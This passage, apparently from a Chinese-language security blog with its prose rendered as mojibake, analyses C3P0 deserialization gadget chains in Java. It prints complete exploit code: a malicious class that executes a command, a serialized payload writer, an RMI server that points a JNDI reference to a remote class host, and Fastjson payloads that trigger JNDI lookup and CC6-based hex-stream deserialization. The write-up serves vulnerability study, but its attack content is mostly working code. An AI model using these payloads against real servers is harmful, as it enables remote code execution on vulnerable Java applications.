class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//åºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Pool_Serial</span><span class="hljs-params">(ConnectionPoolDataSource c)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-comment">//åå°„ä¿®æ”¹connectionPoolDataSourceå±æ€§å€¼ä¸ºæˆ‘ä»¬çš„æ¶æ„ConnectionPoolDataSourceç±»</span><br>        <span class="hljs-type">PoolBackedDataSourceBase</span> <span class="hljs-variable">poolBackedDataSourceBase</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PoolBackedDataSourceBase</span>(<span class="hljs-literal">false</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> poolBackedDataSourceBase.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> cls.getDeclaredField(<span class="hljs-string">&quot;connectionPoolDataSource&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(poolBackedDataSourceBase,c);<br><br>        <span class="hljs-comment">//åºåˆ—åŒ–æµå†™å…¥æ–‡ä»¶</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;exp.bin&quot;</span>));<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>        oos.writeObject(poolBackedDataSourceBase);<br><br>    &#125;<br><br>    <span class="hljs-comment">//ååºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Pool_Deserial</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;exp.bin&quot;</span>));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fis);<br>        objectInputStream.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">EXP_Loader</span> <span class="hljs-variable">exp_loader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EXP_Loader</span>();<br>        Pool_Serial(exp_loader);<br>        Pool_Deserial();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>æ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">exp</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå»èµ·ä¸€ä¸ª8888ç«¯å£çš„æœåŠ¡å™¨ï¼Œæ¶æ„ç±»æ”¾åœ¨æœåŠ¡å™¨ä¸‹å³å¯</p><p><img src="https://cdn.clown2024.cn/image-20241101194419904.png" alt="image-20241101194419904"></p><h2 id="jndiæ³¨å…¥"><a href="#JNDIæ³¨å…¥" class="headerlink" title="JNDIæ³¨å…¥"></a>JNDIæ³¨å…¥</h2><p>è¯¥é“¾å­ä¾èµ–äºFastjsonå’ŒJacksonååºåˆ—åŒ–æ¼æ´</p><p><strong>åˆ©ç”¨é“¾</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#ä¿®æ”¹jndiName<br>JndiRefConnectionPoolDataSource#setJndiName -&gt;<br>JndiRefDataSourceBase#setJndiName<br> <br>#JNDIè°ƒç”¨<br>JndiRefConnectionPoolDataSource#setLoginTimeout -&gt;<br>WrapperConnectionPoolDataSource#setLoginTimeout -&gt;<br>JndiRefForwardingDataSource#setLoginTimeout -&gt;<br>JndiRefForwardingDataSource#inner -&gt;<br>JndiRefForwardingDataSource#dereference() -&gt;<br>Context#lookup<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åˆ©ç”¨é“¾éƒ½æ˜¯ä»setteræ–¹æ³•å¼€å§‹çš„ï¼Œæ‰€ä»¥å°±å¯ä»¥å¾ˆå¥½é…åˆfastjsonæˆ–è€…Jacksonåˆ©ç”¨é“¾</p><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ-1" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>å…¶æ¼æ´ç‚¹åœ¨äºJndiRefConnectionPoolDataSourceç±»ä¸­ï¼Œè¯¥ç±»æœ‰è®¸å¤šçš„setterå’Œgetteræ–¹æ³•ï¼Œå…¶ä¸­æˆ‘ä»¬å¯ä»¥é€šè¿‡setJndiNameæ–¹æ³•æ¥ç»™å±æ€§jndiNameèµ‹å€¼</p><p><img src="https://cdn.clown2024.cn/image-20241102001706522.png" alt="image-20241102001706522"></p><p>ä»–è¿™é‡Œè°ƒç”¨JndiRefConnectionPoolDataSource#setJndiNameæ–¹æ³•çš„æ—¶å€™ï¼Œä¼šå†è·³åˆ°JndiRefDataSourceBase#setJndiNameæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241102001802528.png" alt="image-20241102001802528"></p><p>ä¿®æ”¹äº†nameä¹‹åæˆ‘ä»¬å°±éœ€è¦å»è§¦å‘è°ƒç”¨ï¼Œåˆ©ç”¨åˆ°çš„æ˜¯JndiRefConnectionPoolDataSource#setLoginTimeoutæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241102002128576.png" alt="image-20241102002128576"></p><p>ç„¶åè°ƒç”¨WrapperConnectionPoolDataSource#setLoginTimeoutæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241102002251962.png" alt="image-20241102002251962"></p><p>è¿™é‡Œçš„getNestedDataSourceè¿”å›çš„æ˜¯JndiRefForwardingDataSourceï¼Œå› æ­¤è¿™é‡Œè°ƒç”¨çš„æœ€ç»ˆæ˜¯<code>JndiRefForwardingDataSource#setLoginTimeout</code></p><p><img src="https://cdn.clown2024.cn/image-20241102002633572.png" alt="image-20241102002633572"></p><p>ç„¶åå°±æ˜¯è¿›å…¥inner()æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241102002706468.png" alt="image-20241102002706468"></p><p>åœ¨dereference()æ–¹æ³•è§¦å‘äº†jndiè°ƒç”¨</p><p><img src="https://cdn.clown2024.cn/image-20241102002741246.png" alt="image-20241102002741246"></p><h3 id="åˆ©ç”¨é“¾æ„é€ "><a href="#åˆ©ç”¨é“¾æ„é€ -1" class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h3><p>é€‰ä¸ªä½ç‰ˆæœ¬çš„fastjsonæ¥åšä¾‹å­</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDI_Attack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;JndiName\&quot;:\&quot;rmi://127.0.0.1:1099/hello\&quot;, &quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;LoginTimeout\&quot;:0&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¶æ„rmiæœåŠ¡</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMI_Server</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">register</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;exp&quot;</span>,<span class="hljs-string">&quot;exp&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">refObjWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        Naming.bind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>,refObjWrapper);<br>        System.out.println(<span class="hljs-string">&quot;Registryè¿è¡Œä¸­......&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMI_Server</span>().register();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¶æ„ç±»ç”¨å‰é¢è¿œç¨‹ç±»åŠ è½½çš„é‚£ä¸ª</p><p><img src="https://cdn.clown2024.cn/image-20241103003238269.png" alt="image-20241103003238269"></p><h2 id="åˆ©ç”¨hexæµåŠ è½½ä»»æ„ç±»"><a href="#åˆ©ç”¨HEXæµåŠ è½½ä»»æ„ç±»" class="headerlink" title="åˆ©ç”¨HEXæµåŠ è½½ä»»æ„ç±»"></a>åˆ©ç”¨HEXæµåŠ è½½ä»»æ„ç±»</h2><p>è¯¥åˆ©ç”¨é“¾èƒ½å¤Ÿååºåˆ—åŒ–ä¸€ä¸²åå…­è¿›åˆ¶å­—ç¬¦ä¸²</p><p><strong>åˆ©ç”¨é“¾</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#è®¾ç½®userOverridesAsStringå±æ€§å€¼<br>WrapperConnectionPoolDataSource#setuserOverridesAsString -&gt;<br>WrapperConnectionPoolDataSourceBase#setUserOverridesAsString<br> <br>#åˆå§‹åŒ–ç±»æ—¶ååºåˆ—åŒ–åå…­è¿›åˆ¶å­—èŠ‚æµ<br>WrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource -&gt;<br>C3P0ImplUtils#parseUserOverridesAsString -&gt;<br>SerializableUtils#fromByteArray -&gt;<br>SerializableUtils#deserializeFromByteArray -&gt;<br>ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ-2" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>è¯¥é“¾å­çš„æˆå› æ˜¯å› ä¸ºWrapperConnectionPoolDataSourceçš„æ„é€ æ–¹æ³•ä¸­å¯¹å±æ€§userOverridesçš„èµ‹å€¼å­˜åœ¨å¼‚æ ·å†™æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241103222535119.png" alt="image-20241103222535119"></p><p>è¿™é‡Œè°ƒç”¨C3P0ImplUtils#parseUserOverridesAsStringæ–¹æ³•å°†userOverridesè§£ææˆStringï¼Œä½†userOverridesæœ¬èº«å°±æ˜¯Stringç±»å‹ï¼Œæˆ‘ä»¬è·Ÿè¿›å»çœ‹çœ‹è¿™ä¸ªæ–¹æ³•åšäº†ä»€ä¹ˆ</p><p><img src="https://cdn.clown2024.cn/image-20241103223316471.png" alt="image-20241103223316471"></p><p>è¿™é‡Œä¼šå°†userOverridesçš„HASM_HEADERå˜é‡åé¢çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²æˆªå–å‡ºæ¥ï¼ŒHASM_HEADERçš„å€¼ä¸ºâ€HexAsciiSerializedMapâ€ï¼Œè¿˜ä¼šå°†æœ€åä¸€ä½ç»™å»æ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬åé¢è®¾ç½®å˜é‡çš„å€¼çš„æ—¶å€™è¦åŠ ä¸Šè¿™ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œä¸”æœ€åä¸€ä½åŠ ä¸Šå¤šä¸€ä¸ªå­—ç¬¦æ¯”å¦‚â€;â€æ¥å ä½</p><p>ç„¶åè§£æè¯¥åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºå­—èŠ‚æ•°ç»„ï¼Œå¹¶è°ƒç”¨SerializableUtils#deserializeFromByteArrayæ–¹æ³•æ¥å¤„ç†å­—èŠ‚æ•°ç»„ï¼Œç»§ç»­è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241103224452045.png" alt="image-20241103224452045"></p><p>æ¬¸çœ‹åˆ°è¿™ä¸ªæ–¹æ³•å°±å¾ˆç†Ÿæ‚‰ï¼Œå­—é¢æ„æ€å°±æ˜¯ååºåˆ—åŒ–è¯¥å­—èŠ‚æ•°ç»„ï¼Œå†è·Ÿè¿›å»</p><p><img src="https://cdn.clown2024.cn/image-20241103224710588.png" alt="image-20241103224710588"></p><p>å°±å¯ä»¥çœ‹åˆ°ç›´æ¥è°ƒç”¨äº†readObjectæ–¹æ³•</p><h3 id="åˆ©ç”¨é“¾æ„é€ "><a href="#åˆ©ç”¨é“¾æ„é€ -2" class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h3><p>ä¸Šé¢çš„åˆ©ç”¨é“¾æ„é€ å°±å¾ˆç®€å•äº†ï¼Œç›´æ¥ç”¨cc6çš„å­—èŠ‚ç æ¥åšç¤ºä¾‹</p><p>è¿™é‡Œå°±ç›´æ¥ç”¨çš„æ«å¸ˆå‚…çš„expï¼Œä½¿ç”¨çš„æ˜¯fastjsonæ¥è§¦å‘åˆ©ç”¨é“¾</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.beans.PropertyVetoException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hex_Attack</span> &#123;<br><br>    <span class="hljs-comment">//CC6çš„åˆ©ç”¨é“¾</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">CC6</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-comment">//ä½¿ç”¨InvokeTransformeråŒ…è£…ä¸€ä¸‹</span><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; hashMap1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        TiedMapEntry tiedMapEntry=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;abc&quot;</span>);<br>        HashMap&lt;Object,Object&gt; hashMap2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap2.put(tiedMapEntry,<span class="hljs-string">&quot;eee&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;abc&quot;</span>);<br><br><br>        <span class="hljs-comment">//åå°„ä¿®æ”¹LazyMapç±»çš„factoryå±æ€§</span><br>        Class clazz=LazyMap.class;<br>        Field factoryField= clazz.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazyMap,chainedTransformer);<br><br>        <span class="hljs-keyword">return</span> hashMap2;<br>    &#125;<br><br><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addHexAscii</span><span class="hljs-params">(<span class="hljs-type">byte</span> b, StringWriter sw)</span><br>    &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">ub</span> <span class="hljs-operator">=</span> b &amp; <span class="hljs-number">0xff</span>; <span class="hljs-comment">//è½¬æˆæ— ç¬¦å·æ•´æ•°</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> ub / <span class="hljs-number">16</span>;  <span class="hljs-comment">//è®¡ç®—é«˜ä½åå…­è¿›åˆ¶æ•°å­—</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">h2</span> <span class="hljs-operator">=</span> ub % <span class="hljs-number">16</span>;  <span class="hljs-comment">//è®¡ç®—åœ°ä½åå…­è¿›åˆ¶æ•°å­—</span><br>        sw.write(toHexDigit(h1)); <span class="hljs-comment">//è½¬æ¢æˆå­—ç¬¦ç„¶åå†™å…¥</span><br>        sw.write(toHexDigit(h2));<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">char</span> <span class="hljs-title function_">toHexDigit</span><span class="hljs-params">(<span class="hljs-type">int</span> h)</span><br>    &#123;<br>        <span class="hljs-comment">//é€ä¸ªå­—ç¬¦è¿›è¡Œè½¬æ¢</span><br>        <span class="hljs-type">char</span> out;<br>        <span class="hljs-keyword">if</span> (h &lt;= <span class="hljs-number">9</span>) out = (<span class="hljs-type">char</span>) (h + <span class="hljs-number">0x30</span>);<br>        <span class="hljs-keyword">else</span> out = (<span class="hljs-type">char</span>) (h + <span class="hljs-number">0x37</span>);<br>        <span class="hljs-comment">//System.err.println(h + &quot;: &quot; + out);</span><br>        <span class="hljs-keyword">return</span> out;<br>    &#125;<br><br>    <span class="hljs-comment">//å°†ç±»åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] tobyteArray(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bao);<br>        oos.writeObject(o);<br>        <span class="hljs-keyword">return</span> bao.toByteArray();<br>    &#125;<br><br>    <span class="hljs-comment">//å­—èŠ‚æ•°ç»„è½¬åå…­è¿›åˆ¶</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">toHexAscii</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span><br>    &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> bytes.length;<br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">sw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>(len * <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; len; ++i)<br>            addHexAscii(bytes[i], sw);<br>        <span class="hljs-keyword">return</span> sw.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">hex</span> <span class="hljs-operator">=</span> toHexAscii(tobyteArray(CC6()));<span class="hljs-comment">//è·å–åå…­è¿›åˆ¶å­—ç¬¦ä¸²</span><br>        System.out.println(hex);<br><br>        <span class="hljs-comment">//Fastjson&lt;1.2.47</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;1\&quot;:&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;2\&quot;:&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="hljs-string">&quot;;\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241103225728831.png" alt="image-20241103225728831"></p><p>ä½ç‰ˆæœ¬fastjsonä¹Ÿå¯ä»¥ç›´æ¥ç”¨ç®€å•ä¸€ç‚¹çš„payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">String payload = &quot;&#123;&quot; +<br>        &quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot; +<br>        &quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+ hex + &quot;;\&quot;,&quot; +<br>        &quot;&#125;&quot;;<br></code></pre></td></tr></table></figure><p><strong>ç‰¹æ®Šçš„åœ°æ–¹</strong></p><p>ä½†æ ¹æ®ä¸Šé¢çš„åˆ©ç”¨æµç¨‹æ¥çœ‹ï¼Œå¦‚æœé…åˆfastjsonçš„é“¾å­ï¼Œè¿™é‡Œæˆ‘ä»¬çš„WrapperConnectionPoolDataSourceç±»è‡³å°‘éœ€è¦è°ƒç”¨ä¸¤æ¬¡æ„é€ æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªæ¬¡æ˜¯è°ƒç”¨æˆ‘ä»¬çš„setteræ–¹æ³•ï¼Œç¬¬äºŒæ¬¡æ˜¯è°ƒç”¨æ„é€ æ–¹æ³•è§¦å‘é“¾å­</p><p>å…³é”®çš„åœ°æ–¹å°±åœ¨ä»–çš„setUserOverridesAsStringæ–¹æ³•é‡Œé¢ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241103235801196.png" alt="image-20241103235801196"></p><p>å½“æˆ‘ä»¬è°ƒç”¨è¯¥setteræ—¶ï¼Œé¦–å…ˆä¼šä¸æ—§çš„<code>userOverridesAsString</code>å±æ€§æ¯”è¾ƒï¼Œè¿™é‡Œæ—§å€¼ä¸º<code>null</code>ï¼Œæ–°å€¼ä¸ºæˆ‘ä»¬æ„é€ çš„<code>userOverridesAsString</code>ï¼Œå› æ­¤è¿™é‡Œä¼šè¿›å…¥ifåˆ¤æ–­ã€‚</p><p>ä¸€è·¯è·Ÿè¿›æ–¹æ³•ï¼Œæœ€ç»ˆåˆ°<code>WrapperConnectionPoolDataSource#vetoableChange</code>æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241104000506391.png" alt="image-20241104000506391"></p><p>è¿™é‡ŒpropNameå°±æ˜¯userOverridesAsStringï¼Œæˆ‘ä»¬ä¼šèµ°åˆ°è¿™ä¸ªåˆ¤æ–­é‡Œé¢ï¼Œç„¶åç›´æ¥è°ƒç”¨C3P0ImplUtils#parseUserOverridesAsStringæ–¹æ³•å¯¹æˆ‘ä»¬ä¼ å…¥çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²è¿›è¡Œè§£æï¼Œå°±å‡å°‘äº†ä¸€æ¬¡éœ€è¦è°ƒç”¨æ„é€ å‡½æ•°çš„æ“ä½œ</p><h1 id="c3p0ä¸å‡ºç½‘åˆ©ç”¨"><a href="#C3P0ä¸å‡ºç½‘åˆ©ç”¨" class="headerlink" 